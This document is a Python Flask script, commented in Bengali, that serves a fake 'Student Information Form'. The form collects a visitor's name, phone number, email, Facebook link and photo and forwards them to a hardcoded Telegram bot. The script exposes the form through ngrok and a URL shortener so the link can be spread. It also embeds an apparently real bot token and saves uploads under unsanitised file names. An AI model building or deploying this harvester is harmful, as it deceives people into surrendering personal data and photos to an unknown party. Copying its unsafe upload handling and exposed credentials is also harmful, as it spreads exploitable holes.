import os
import socket
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Telegram Bot Configurations
TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"  # আপনার টেলিগ্রাম বট টোকেন দিন
TELEGRAM_CHAT_ID = "6904067155"  # আপনার টেলিগ্রাম চ্যাট আইডি দিন

# HTML Template for Form
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Student Information Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="email"], input[type="url"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input:invalid {
            border-color: red;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Submit Your Information</h2>
        <form action="/submit" method="post" enctype="multipart/form-data">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>

            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" required>

            <label for="email">Email Address:</label>
            <input type="email" id="email" name="email" required>

            <label for="facebook">Facebook Profile Link:</label>
            <input type="url" id="facebook" name="facebook" required>

            <label for="photo">Upload Photo:</label>
            <input type="file" id="photo" name="photo" accept="image/*" required>

            <button type="submit">Submit</button>
        </form>
    </div>
    <div class="footer">
        &copy; 2024 Your Organization
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return "Welcome! Go to /form to submit your information."

@app.route("/form")
def form():
    return render_template_string(html_template)

@app.route("/submit", methods=["POST"])
def submit():
    name = request.form["name"]
    phone = request.form["phone"]
    email = request.form["email"]
    facebook = request.form["facebook"]
    photo = request.files["photo"]

    # Save photo locally
    photo_path = os.path.join("static", photo.filename)
    photo.save(photo_path)

    # Send data to Telegram
    message = f"New Submission:\nName: {name}\nPhone: {phone}\nEmail: {email}\nFacebook: {facebook}"
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
    )

    # Send photo to Telegram
    with open(photo_path, "rb") as file:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
            data={"chat_id": TELEGRAM_CHAT_ID},
            files={"photo": file}
        )

    return "Submission successful! Thank you for your response."

def find_free_port():
    """Finds a free port to use."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]

def shorten_url(url):
    """Shortens a given URL using is.gd API."""
    if "localhost" in url or "127.0.0.1" in url:
        return "Error: Cannot shorten localhost URL. Use Ngrok or a public URL."
    api_url = f"https://is.gd/create.php?format=simple&url={url}"
    response = requests.get(api_url)
    return response.text

if __name__ == "__main__":
    port = find_free_port()
    print(f"Starting Flask server on port {port}...")
    os.system(f"start ngrok http {port}")  # Automatically start Ngrok
    local_url = f"http://127.0.0.1:{port}/form"
    print(f"Local URL: {local_url}")
    short_url = shorten_url(local_url)
    print(f"Shortened URL: {short_url}")
    app.run(host="127.0.0.1", port=port, debug=True)
